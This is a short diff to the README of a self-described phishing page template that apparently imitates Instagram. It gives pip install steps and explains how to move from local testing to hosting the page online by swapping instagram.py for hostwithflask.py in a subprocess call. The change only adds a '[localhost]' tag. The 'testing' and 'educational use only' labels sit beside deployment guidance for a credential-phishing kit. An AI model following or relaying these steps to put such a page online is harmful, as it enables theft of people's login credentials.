@@ -17,7 +17,7 @@ A brief simple phishing page template.
   pip install flask
 ```
 ## For Testing purposes only.
-- You can use instagram.py directly if you just intend to see how it works ^^
+- You can use instagram.py directly if you just intend to see how it works [localhost] ^^
 - If you wanna be fancy and make it accessible online then you may use hostwithflask.py instead, just modify ` subprocess.run(["python", "instagram/instagram.py"]) ` to ` subprocess.run(["python", "instagram/hostwithflask.py"]) `
 
 ## Educational Use Only.
